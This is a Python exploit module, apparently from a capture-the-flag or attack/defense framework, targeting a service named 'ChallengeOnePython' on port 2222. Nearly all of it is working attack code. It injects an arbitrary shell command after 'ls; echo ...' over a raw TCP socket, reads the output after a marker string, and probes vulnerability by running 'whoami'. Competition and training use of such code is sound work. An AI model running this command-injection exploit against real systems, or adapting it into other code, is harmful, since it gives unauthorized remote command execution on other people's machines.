import socket
from Exploit import Exploit, PatchedException
from BetterLogger import logger

COLOR_OKGREEN = '\033[92m'
COLOR_OKBLUE = '\033[94m'
COLOR_ORANGE = '\033[93m'
COLOR_FAIL = '\033[91m'
COLOR_END = '\033[0m'

class ChallengeOnePython(Exploit):
	def __init__(self, ip_address) -> None:
		super().__init__(ip_address=ip_address)

	def run_custom_command(self, command):
		port = 2222
		logger.info(f"Connecting to port {port}...")
		socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		socket_connection.settimeout(3)
		socket_connection.connect((self.ip_address, port))
		socket_connection.settimeout(None)
		logger.info(f"Successfully connected to port {port}.")

		exploit_command = f"ls; echo '0x1x2x3'; {command}" # echo 0x1x2x3 so we can parse for where the actual command injection output begins
		logger.info(f"Running command `{exploit_command}`...")
		socket_connection.sendall(exploit_command.encode())
		socket_connection.shutdown(socket.SHUT_WR)
		socket_response = ""
		while 1:
			data = socket_connection.recv(1024)
			if len(data) == 0:
				break
			socket_response = data.decode()
		socket_connection.close()
		logger.debug(socket_response)
		try:
			server_output = socket_response.split("0x1x2x3")[1].strip() # split on `0x1x2x3` so we can parse for the command injection output
			return server_output
		except IndexError:
			raise PatchedException("The target is patched")

	def test_if_vulnerable(self):
		"""
		Returns True if vulnerable and False if not
		"""
		try:
			logger.info("Testing if the target is vulnerable to ChallengeOnePython...")
			command = "whoami"
			try:
				self.run_custom_command(command=command)
				logger.info(f"{COLOR_OKGREEN}The target is vulnerable to ChallengeOnePython!{COLOR_END}")
				return True
			except ConnectionRefusedError:
				logger.info(f"{COLOR_ORANGE}The challenge one python service is not running!{COLOR_END}")
				return False
			except socket.timeout:
				logger.info(f"{COLOR_ORANGE}The challenge one python service timed out!{COLOR_END}")
				return False
		except PatchedException:
			logger.info(f"{COLOR_FAIL}The target is not vulnerable to ChallengeOnePython.{COLOR_END}")
			return False
